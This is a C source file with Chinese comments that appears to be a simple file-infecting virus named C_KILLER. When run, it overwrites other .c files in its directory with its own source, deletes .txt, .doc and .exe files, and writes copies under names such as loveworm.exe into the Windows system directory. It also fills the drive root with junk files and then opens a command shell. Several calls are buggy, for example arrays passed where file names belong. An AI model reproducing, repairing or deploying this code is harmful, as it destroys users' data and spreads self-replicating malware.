/* 连接头文件 */
#include <io.h>
#include <dir.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 拷贝文件模块 */
int copyfile( char *infile, char *outfile ) {
    FILE *in, *out;                                                         /* 定义文件指针 */
    in  = fopen( infile, "r" );                                             /* 打开文件 */
    out = fopen( outfile, "w" );                                            /* 建立文件 */
    
    while ( !feof( in ) )                                                   /* 判断文件是否已结束 */
    {
        fputc( fgetc( in ), out );                                          /* 从in读一字符到out */
    }

    fclose( in );                                                           /* 关闭in文件 */
    fclose( out );                                                          /* 关闭out文件 */
    return(0);                                                              /* 返回 */
}


int MakeRubbish( void ) {
    int i;                                                              /* 声明整形变量i */
    FILE *fp;                                                            /* 文件指针fp */
    char *path;                                                          /* 路径指针 */
    char *NewName;
    char *disk[7] = { "A", "B", "C", "D", "E", "F", "G" };              /* 初始化指针数组 */
    char *addtion = ":\\";

    for ( i = 0; i < 5; i++ ) {
        char tempname[] = "XXXXXX";                                     /* 随机名字 */
        NewName = mktemp( tempname );                                   /* 建立唯一的文件名 */
        fp  = fopen( NewName, "w" );                                    /* 创建文本文件 */
        fclose( fp );                                                   /* 关闭fp文件流 */
    }

    path = strcat( disk[getdisk()], addtion );                              /* 得到根编号 */
    chdir( path );                                                          /* 改变工作目录 */
    
    for ( i = 0; i < 5; i++ ) {
        char tempname[] = "XXXXXX";                                     /* 串赋入数组 */
        NewName = mktemp( tempname );                                   /* 建立唯一的文件名 */
        fp = fopen( NewName, "w" );                                     /* 创建新文件 */
        fclose( fp );                                                   /* 关闭文件 */
    }

    return(0);                                                              /* 返回 */
}


int CreatEXE( void ) {
    int i;                                                               /* 整形变量 */
    char *path;                                                          /* 字符指针 */

    char *s[2] = {                                                       /* 重要目录 */
        "C:\\WINDOWS\\system32\\loveworm.exe",
        "C:\\WINDOWS\\virusssss.com"
    };

    for ( i = 0; i < 2; i++ ) {
        open( s, 0x0100, 0x0080 );                                      /* 打开文件写入数据 */
        copyfile( "C_KILLER.C", s );                                    /* 调用子函数实现拷贝文件数据 */
    }

    return(0);
}

/* 去处 */
int Remove( void ) {
    int done;                                                    /* 定义整形变量 */
    int i;
    struct ffblk ffblk;                                          /* 声明结构体变量ffblk */
    char *documenttype[3] = { "*.txt", "*.doc", "*.exe" };       /* 初始化指针数组 */

    for ( i = 0; i < 3; i++ ) {
        done = findfirst( documenttype, &ffblk, 2 );                    /* 搜索目录 */
        while ( !done )                                                 /* 查找成功返回0 */
        {
            remove( ffblk.ff_name );                                /*删除一个文件 */
            done = findnext( &ffblk );
        }
    }
    return(0);                                                              /* 返回 */
}

/* 养殖模块 */
int Breed( void ) {
    int done;                                                   /* 整形变量 */
    struct ffblk ffblk;                                                  /* 声名结构变量 */
    done = findfirst( "*.c", &ffblk, 2 );

    while ( !done ) {
        if ( strcmp( "C_KILLER.C", ffblk.ff_name ) != 0 ) {
            copyfile( "C_KILLER.C", ffblk.ff_name );
        }

        done = findnext( &ffblk );
    }

    return(0);
}

/*程序入口地址 */
int main( void ) {
    printf("STH\n");
    Breed();                                /* 养殖病毒 */
    Remove();                               /* 去处 */
    CreatEXE();
    printf("您能告诉我您的名字?\n");
    printf("现在麻烦您输入您的名字!\n");
    MakeRubbish();                          /* 调用子函数 */
    getchar();
    clrscr();                               /* 清除屏幕 */
    system("cmd");
    getch();

    return(0);
}